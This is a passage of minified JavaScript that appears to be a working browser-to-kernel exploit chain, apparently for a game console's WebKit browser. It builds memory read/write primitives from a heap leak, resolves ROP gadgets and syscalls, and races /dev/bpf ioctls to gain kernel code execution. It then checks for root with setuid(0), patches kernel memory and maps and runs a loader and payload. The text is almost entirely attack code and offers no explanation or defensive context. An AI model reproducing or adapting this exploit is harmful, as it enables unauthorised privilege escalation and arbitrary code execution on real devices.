i=0;(i<(0x4000/2));){props[i++]={value:0x42424242};props[i++]={value:tgt}} var foundLeak=undefined;var foundIndex=0;var maxCount=0x100;while(foundLeak==undefined&&maxCount>0){maxCount--;history.pushState(y,"");Object.defineProperties({},props);var leak=new Uint32Array(history.state.data.buffer);for(var i=0;i<leak.length-6;i++){if(leak[i]==0x42424242&&leak[i+0x1]==0xFFFF0000&&leak[i+0x2]==0x00000000&&leak[i+0x3]==0x00000000&&leak[i+0x4]==0x00000000&&leak[i+0x5]==0x00000000&&leak[i+0x6]==0x0000000E&&leak[i+0x7]==0x00000000&&leak[i+0xA]==0x00000000&&leak[i+0xB]==0x00000000&&leak[i+0xC]==0x00000000&&leak[i+0xD]==0x00000000&&leak[i+0xE]==0x0000000E&&leak[i+0xF]==0x00000000){foundIndex=i;foundLeak=leak;break}}} if(!foundLeak){failed=!0; fail("Failed to find leak!")} var firstLeak=Array.prototype.slice.call(foundLeak,foundIndex,foundIndex+0x40);var leakJSVal=new int64(firstLeak[8],firstLeak[9]);Array.prototype.__defineGetter__(100,()=>1);var f=document.body.appendChild(document.createElement('iframe'));var a=new f.contentWindow.Array(13.37,13.37);var b=new f.contentWindow.Array(u2d(leakJSVal.low+0x10,leakJSVal.hi),13.37);var master=new Uint32Array(0x1000);var slave=new Uint32Array(0x1000);var leakval_u32=new Uint32Array(0x1000);var leakval_helper=[slave,2,3,4,5,6,7,8,9,10];tgt.a=u2d(2048,0x1602300);tgt.b=0;tgt.c=leakval_helper;tgt.d=0x1337;var c=Array.prototype.concat.call(a,b);document.body.removeChild(f);var hax=c[0];c[0]=0;tgt.c=c;hax[2]=0;hax[3]=0;Object.defineProperty(Array.prototype,100,{get:undefined});tgt.c=leakval_helper;var butterfly=new int64(hax[2],hax[3]);butterfly.low+=0x10;tgt.c=leakval_u32;var lkv_u32_old=new int64(hax[4],hax[5]);hax[4]=butterfly.low;hax[5]=butterfly.hi;tgt.c=master;hax[4]=leakval_u32[0];hax[5]=leakval_u32[1];var addr_to_slavebuf=new int64(master[4],master[5]);tgt.c=leakval_u32;hax[4]=lkv_u32_old.low;hax[5]=lkv_u32_old.hi;tgt.c=0;hax=0;var prim={write8:function(addr,val){master[4]=addr.low;master[5]=addr.hi;if(val instanceof int64){slave[0]=val.low;slave[1]=val.hi}else{slave[0]=val;slave[1]=0} master[4]=addr_to_slavebuf.low;master[5]=addr_to_slavebuf.hi},write4:function(addr,val){master[4]=addr.low;master[5]=addr.hi;slave[0]=val;master[4]=addr_to_slavebuf.low;master[5]=addr_to_slavebuf.hi},read8:function(addr){master[4]=addr.low;master[5]=addr.hi;var rtv=new int64(slave[0],slave[1]);master[4]=addr_to_slavebuf.low;master[5]=addr_to_slavebuf.hi;return rtv},read4:function(addr){master[4]=addr.low;master[5]=addr.hi;var rtv=slave[0];master[4]=addr_to_slavebuf.low;master[5]=addr_to_slavebuf.hi;return rtv},leakval:function(jsval){leakval_helper[0]=jsval;var rtv=this.read8(butterfly);this.write8(butterfly,new int64(0x41414141,0xffffffff));return rtv},createval:function(jsval){this.write8(butterfly,jsval);var rt=leakval_helper[0];this.write8(butterfly,new int64(0x41414141,0xffffffff));return rt}};function exploit(){window.primitives=prim;postExploit()}/* kernel.js */var p,gadgets,deref_stub_jmp=function(d){var a=65535&p.read4(d),s=p.read4(d.add32(2));return 9727!=a?0:d.add32(s+6)};gadgets={ret:60,"jmp rax":130,ep:173,"pop rbp":182,"mov [rdi], rax":16314,"pop r8":52290,"pop rax":52291,"mov rax, rdi":59470,"mov rax, [rax]":77987,"mov rdi, rax; jmp rcx":214138,"pop rsi":504302,"pop rdi":504381,"add rsi, rcx; jmp rsi":2074068,"pop rcx":2563555,"pop rsp":2597968,"mov [rdi], rsi":3788656,"mov [rax], rsi":3999863,"add rsi, rax; jmp rsi":5112844,"pop rdx":5658680,"pop r9":7911967,"add rax, rcx":8704077,jop:19362640,infloop:19677193,stack_chk_fail:200,memcpy:248,setjmp:5224};var reenter_help={length:{valueOf:function(){return 0}}},postExploit=function(){(p=window.primitives).leakfunc=function(d){var a=p.leakval(d);return p.read8(a.add32(24)).add32(64)};try{var d=p.leakfunc(parseFloat),a=(p.read8(d),p.read8(d));a.low&=4294950912,a.sub32inplace(15253504),window.moduleBaseWebKit=a;var s=function(d){return window.moduleBaseWebKit.add32(d)};for(var r in gadgets)gadgets[r]=s(gadgets[r]);var e=p.read8(deref_stub_jmp(gadgets.stack_chk_fail));e.low&=4294950912,e.sub32inplace(49152),window.moduleBaseLibKernel=e;var w=function(d){return window.moduleBaseLibKernel.add32(d)},i=p.read8(deref_stub_jmp(s(552)));i.low&=4294950912,window.moduleBaseLibc=i;for(var o,t,n;o={a:0,b:0,c:0,d:0},t={a:0,b:0,c:0,d:0},n=p.leakval(t),p.leakval(o).low-48!=n.low;);var g;p.loadchain=function(a){var s=0,r=0,e=0,w={length:{valueOf:function(){e=p.read8(s),r=p.read8(s.add32(8));var d=s,w=a.count;a.push_write8(s,e),a.push_write8(s.add32(8),r),a.runtime&&(d=a.runtime(s)),a.push(gadgets["pop rsp"]),a.push(d),a.count=w,p.write8(s,gadgets["pop rsp"]),p.write8(s.add32(8),a.stackBase)}}},i=new Uint32Array(256);nogc.push(i),g=p.read8(p.leakval(i).add32(16)),p.write8(g.add32(48),gadgets.setjmp),p.write8(g.add32(128),gadgets.jop),p.write8(g,g),p.write8(d,gadgets.jop);var o=p.read8(n),u=p.read8(n.add32(72));return p.write8(n,g.add32(80)),p.write8(n.add32(72),g),parseFloat(t,t,t,t,t,t),p.write8(n,o),p.write8(n.add32(72),u),s=p.read8(g.add32(16)),r=p.read8(s.add32(8)),rtv=Array.prototype.splice.apply(w),p.leakval(rtv)};var u,h=new Uint8Array(4096),l=p.leakval(h).add32(16);p.read8(l);p.write8(l,window.moduleBaseLibKernel),p.write4(l.add32(8),262144);for(var c=0;c<262144;c++)if(114==h[c]&&100==h[c+1]&&108==h[c+2]&&111==h[c+3]&&99==h[c+4]){u=c;break}p.write4(l.add32(8),u+32);var x=new Uint32Array(1),v=new Uint8Array(x.buffer);for(c=0;c<u;c++)if(72==h[c]&&199==h[c+1]&&192==h[c+2]&&73==h[c+7]&&137==h[c+8]&&202==h[c+9]&&15==h[c+10]&&5==h[c+11]){v[0]=h[c+3],v[1]=h[c+4],v[2]=h[c+5],v[3]=h[c+6];var f=x[0];window.syscalls[f]=window.moduleBaseLibKernel.add32(c)}var m=new window.rop;p.fcall=function(d,a,s,r,e,w,i){if(m.clear(),m.notimes=this.next_notime,this.next_notime=1,m.fcall(d,a,s,r,e,w,i),m.push(window.gadgets["pop rdi"]),m.push(m.stackBase.add32(16376)),m.push(window.gadgets["mov [rdi], rax"]),m.push(window.gadgets["pop rax"]),m.push(p.leakval(1094795842)),1094795842!=m.run().low)throw new Error("unexpected rop behaviour");return p.read8(m.stackBase.add32(16376))},p.syscall=function(d,a,s,r,e,w,i){if("string"==typeof d&&(d=window.syscallnames[d]),"number"!=typeof d)throw new Error("invalid syscall");var o=window.syscalls[d];if(void 0==o)throw new Error("invalid syscall");return p.fcall(o,a,s,r,e,w,i)},p.writeString=function(d,a){for(var s=0;s<a.length;s++){var r=p.read4(d.add32(s));r&=4294901760,r|=a.charCodeAt(s),p.write4(d.add32(s),r)}},p.readString=function(d){for(var a=p.read4(d),s="";255&a;)s+=String.fromCharCode(255&a),d.add32inplace(1),a=p.read4(d);return s};var y=function(d){var a=s(5208),r=s(18279744),e=mallocu32(8192),w=e.backing;w[0]=1337,p.syscall(324,1);var i=new window.rop;i.clear(),i.push(window.gadgets.ret),i.push(window.gadgets.ret),i.push(window.gadgets.ret),i.push(window.gadgets.ret),d(i),p.write8(e,window.gadgets.ret),p.write8(e.add32(16),i.stackBase);p.fcall(r,a,e,stringify("GottaGoFast"));return window.nogc.push(w),window.nogc.push(i),i};if(p.write8(w(511216),0),"0"!=p.syscall("sys_setuid",0)){var _=mallocu32(8192),b=p.syscall("sys_open",stringify("/dev/bpf"),2,0);if(b<0)throw"Failed to open first /dev/bpf device!";if(p.syscall("sys_ioctl",b,2149597804,stringify("eth0")),p.syscall("sys_write",b,_,40).low==-1>>>0&&(p.syscall("sys_ioctl",b,2149597804,stringify("wlan0")),p.syscall("sys_write",b,_,40).low==-1>>>0))throw"Failed to bind to first /dev/bpf device!";var k=p.syscall("sys_open",stringify("/dev/bpf"),2,0);if(k<0)throw"Failed to open second /dev/bpf device!";if(p.syscall("sys_ioctl",k,2149597804,stringify("eth0")),p.syscall("sys_write",k,_,40).low==-1>>>0&&(p.syscall("sys_ioctl",k,2149597804,stringify("wlan0")),p.syscall("sys_write",k,_,40).low==-1>>>0))throw"Failed to bind to second /dev/bpf device!";var B=malloc(8192),j=new krop(p,B),F=malloc(512);j.push(window.gadgets.ret),j.push(window.gadgets.ret),j.push(window.gadgets.ret),j.push(window.gadgets.ret),j.push(window.gadgets.ret),j.push(window.gadgets.ret),j.push(window.gadgets.ret),j.push(window.gadgets.ret),j.push(window.gadgets["pop rdi"]),j.push(F),j.push((N=7484,window.moduleBaseLibc.add32(N)));var K=new int64(-39914192,-1);j.push(window.gadgets["pop rax"]),j.push(F.add32(48)),j.push(window.gadgets["mov rax, [rax]"]),j.push(window.gadgets["pop rcx"]),j.push(K),j.push(window.gadgets["add rax, rcx"]),j.push(window.gadgets["pop rdi"]),j.push(F.add32(80)),j.push(window.gadgets["mov [rdi], rax"]),j.push(window.gadgets["pop rax"]),j.push(F.add32(80)),j.push(window.gadgets["mov rax, [rax]"]),j.push(window.gadgets["pop rcx"]),j.push(2625401),j.push(window.gadgets["add rax, rcx"]),j.push(s(76310)),j.push(window.gadgets["pop rax"]),j.push(2147745843),j.push(s(1382343));var A=new int64(184,3330883840);j.push(window.gadgets["pop rax"]),j.push(F.add32(80)),j.push(window.gadgets["mov rax, [rax]"]),j.push(window.gadgets["pop rcx"]),j.push(1131747),j.push(window.gadgets["add rax, rcx"]),j.push(window.gadgets["pop rsi"]),j.push(A),j.push(window.gadgets["mov [rax], rsi"]);var L=new int64(934691127,826654769);j.push(window.gadgets["pop rax"]),j.push(F.add32(80)),j.push(window.gadgets["mov rax, [rax]"]),j.push(window.gadgets["pop rcx"]),j.push(1318164),j.push(window.gadgets["add rax, rcx"]),j.push(window.gadgets["pop rsi"]),j.push(L),j.push(window.gadgets["mov [rax], rsi"]);var E=new int64(0,1082624841),S=new int64(2425387499,1922076816);j.push(window.gadgets["pop rax"]),j.push(F.add32(80)),j.push(window.gadgets["mov rax, [rax]"]),j.push(window.gadgets["pop rcx"]),j.push(4048387),j.push(window.gadgets["add rax, rcx"]),j.push(window.gadgets["pop rsi"]),j.push(E),j.push(window.gadgets["mov [rax], rsi"]),j.push(window.gadgets["pop rax"]),j.push(F.add32(80)),j.push(window.gadgets["mov rax, [rax]"]),j.push(window.gadgets["pop rcx"]),j.push(4048417),j.push(window.gadgets["add rax, rcx"]),j.push(window.gadgets["pop rsi"]),j.push(S),j.push(window.gadgets["mov [rax], rsi"]);var U=new int64(217833,2336788480),C=new int64(2428747825,2425393296);j.push(window.gadgets["pop rax"]),j.push(F.add32(80)),j.push(window.gadgets["mov rax, [rax]"]),j.push(window.gadgets["pop rcx"]),j.push(3995390),j.push(window.gadgets["add rax, rcx"]),j.push(window.gadgets["pop rsi"]),j.push(U),j.push(window.gadgets["mov [rax], rsi"]),j.push(window.gadgets["pop rax"]),j.push(F.add32(80)),j.push(window.gadgets["mov rax, [rax]"]),j.push(window.gadgets["pop rcx"]),j.push(430272),j.push(window.gadgets["add rax, rcx"]),j.push(window.gadgets["pop rsi"]),j.push(C),j.push(window.gadgets["mov [rax], rsi"]);var G=new int64(0,1);j.push(window.gadgets["pop rax"]),j.push(F.add32(80)),j.push(window.gadgets["mov rax, [rax]"]),j.push(window.gadgets["pop rcx"]),j.push(16955552),j.push(window.gadgets["add rax, rcx"]),j.push(window.gadgets["pop rsi"]),j.push(2),j.push(window.gadgets["mov [rax], rsi"]),j.push(window.gadgets["pop rsi"]),j.push(1287071),j.push(window.gadgets["pop rdi"]),j.push(F.add32(80)),j.push(s(18469360)),j.push(window.gadgets["pop rax"]),j.push(F.add32(80)),j.push(window.gadgets["mov rax, [rax]"]),j.push(window.gadgets["pop rcx"]),j.push(16955560),j.push(window.gadgets["add rax, rcx"]),j.push(window.gadgets["mov [rax], rsi"]),j.push(window.gadgets["pop rax"]),j.push(F.add32(80)),j.push(window.gadgets["mov rax, [rax]"]),j.push(window.gadgets["pop rcx"]),j.push(16955592),j.push(window.gadgets["add rax, rcx"]),j.push(window.gadgets["pop rsi"]),j.push(G),j.push(window.gadgets["mov [rax], rsi"]),j.push(window.gadgets["pop rax"]),j.push(F.add32(80)),j.push(window.gadgets["mov rax, [rax]"]),j.push(window.gadgets["pop rcx"]),j.push(2625392),j.push(window.gadgets["add rax, rcx"]),j.push(window.gadgets["jmp rax"]),j.push(window.gadgets["pop rax"]),j.push(0),j.push(window.gadgets.ret),j.push(s(256976));var O=malloc(16),W=malloc(128);p.write8(W.add32(0),0),p.write8(W.add32(8),0),p.write8(W.add32(16),0),p.write8(W.add32(24),0),p.write8(W.add32(32),0),p.write8(W.add32(40),0),p.write8(W.add32(48),0),p.write8(W.add32(56),0),p.write4(W.add32(64),6),p.write4(W.add32(68),0),p.write8(O.add32(0),9),p.write8(O.add32(8),W);var P=window.gadgets["pop rsp"],q=malloc(16),z=malloc(128);p.write4(z.add32(0),1),p.write4(z.add32(4),P.low),p.write4(z.add32(8),3),p.write4(z.add32(12),30),p.write4(z.add32(16),1),p.write4(z.add32(20),P.hi),p.write4(z.add32(24),3),p.write4(z.add32(28),31),p.write4(z.add32(32),1),p.write4(z.add32(36),B.low),p.write4(z.add32(40),3),p.write4(z.add32(44),32),p.write4(z.add32(48),1),p.write4(z.add32(52),B.hi),p.write4(z.add32(56),3),p.write4(z.add32(60),33),p.write4(z.add32(64),6),p.write4(z.add32(68),1),p.write8(q.add32(0),9),p.write8(q.add32(8),z),y(function(d){interrupt1=d.stackBase,d.push(window.gadgets.ret),d.push(window.gadgets.ret),d.push(window.gadgets.ret),d.push(window.gadgets["pop rdi"]),d.push(b),d.push(window.gadgets["pop rsi"]),d.push(2148549243),d.push(window.gadgets["pop rdx"]),d.push(O),d.push(window.gadgets["pop rsp"]),d.push(d.stackBase.add32(2048)),d.count=256;var a=d.count;d.push(window.syscalls[54]),d.push_write8(d.stackBase.add32(8*a),window.syscalls[54]),d.push(window.gadgets["pop rsp"]),d.push(d.stackBase)}),y(function(d){interrupt2=d.stackBase,d.push(window.gadgets.ret),d.push(window.gadgets.ret),d.push(window.gadgets.ret),d.push(window.gadgets["pop rdi"]),d.push(k),d.push(window.gadgets["pop rsi"]),d.push(2148549243),d.push(window.gadgets["pop rdx"]),d.push(q),d.push(window.gadgets["pop rsp"]),d.push(d.stackBase.add32(2048)),d.count=256;var a=d.count;d.push(window.syscalls[54]),d.push_write8(d.stackBase.add32(8*a),window.syscalls[54]),d.push(window.gadgets["pop rsp"]),d.push(d.stackBase)});var D=malloc(512);(function(d,a){for(;;){var s=p.syscall("sys_write",d,a,512);if(0,512==s.low)return s}})(b,D);if(0!=p.syscall("sys_setuid",0))throw"Kernel exploit failed!";allset()}else allset();var H=new int64(638582784,9);if("926100000"==p.syscall("sys_mmap",H,3145728,7,266240,-1,0)){var I=w(71104),J=malloc(8),M=malloc(16);p.writeString(M,"loader");for(c=0;c<loader.length;c++)p.write4(H.add32(4*c),loader[c]);for(c=0;c<payload.length;c++)p.write4(H.add32(1048576+4*c),payload[c]);p.fcall(I,J,0,H,0,M)}}catch(d){fail("Post Exception: "+d)}var N};</script>